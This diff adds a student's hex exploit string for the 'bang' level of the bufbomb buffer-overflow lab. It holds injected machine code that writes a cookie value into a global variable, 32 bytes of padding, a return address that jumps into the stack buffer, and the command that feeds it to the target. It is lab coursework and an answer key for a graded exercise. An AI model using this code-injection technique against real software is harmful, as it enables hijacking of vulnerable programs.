@@ -1,0 +1,27 @@
+/* getbuf return address at 0x0x55683314 */
+/* Local buffle start at address 0x556832e8 */
+/* 
+	instructions :
+		cat bang_1190202128.txt |./hex2raw  | ./bufbomb -u 1190202128 
+
+*/
+
+/*
+    inserted codes :
+    function :
+        change the global variable value into cookie value
+    asmcode :
+        movl $0x0804e138,%eax
+        movl $0x4e171ddc,(%eax)
+        ret
+*/
+b8 38 e1 04 08 c7 00 dc 1d 17 4e c3 
+
+/* Padding required : 32 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+/* inserted codes address */
+e8 32 68 55
+
+/* bang address */
+38 8c 04 08
